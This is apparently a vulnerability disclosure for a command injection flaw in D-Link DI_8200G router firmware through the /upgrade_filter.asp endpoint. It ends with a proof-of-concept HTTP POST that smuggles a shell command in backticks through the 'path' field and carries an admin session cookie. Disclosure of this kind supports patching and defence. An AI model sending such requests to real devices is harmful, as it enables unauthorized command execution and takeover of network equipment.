
# Information

**Vendor of the products:**  D-Link

**Vendor's website:** https://www.dlink.com.cn/

**Affected products:** DI_8200G

**Affected firmware version:** V17.12.20A1

**Firmware download address:** [D-Link Technical Support]([D-Link Technical Support](https://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DI-8200G))

**Submitter:** Yun Zhang (DavCloudz)

# Overview

A validation command execution vulnerability was discovered in D-Link's related product DI_8200G, which can be exploited by attackers by sending malicious HTTP Post packets to cause arbitrary command execution, which can be triggered when the request path is /upgrade_filter.asp

# Vulnerability details

The API for invoking the function

<img width="1650" height="486" alt="image-20251223143904822" src="https://github.com/user-attachments/assets/84a9e3f4-be7d-4114-95d0-f021f5637065" />

Here you can find that the value of path and time is taken, and finally the splicing enters the system to implement the command execution

<img width="1896" height="1143" alt="image-20251223143950906" src="https://github.com/user-attachments/assets/a9306f25-a1e5-4ea7-9cb3-b2177f70abba" />


# POC

```
POST /upgrade_filter.asp HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: wysLanguage=CN; userid=admin; gw_userid=admin,gw_passwd=F499CB5B7A1156B90910F2EE55A10A99
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

time=acf&path=`ls>/1.txt`
```

<img width="1209" height="345" alt="image-20251223144138762" src="https://github.com/user-attachments/assets/73d6cb8d-3a76-4996-bacb-1466fd221eab" />
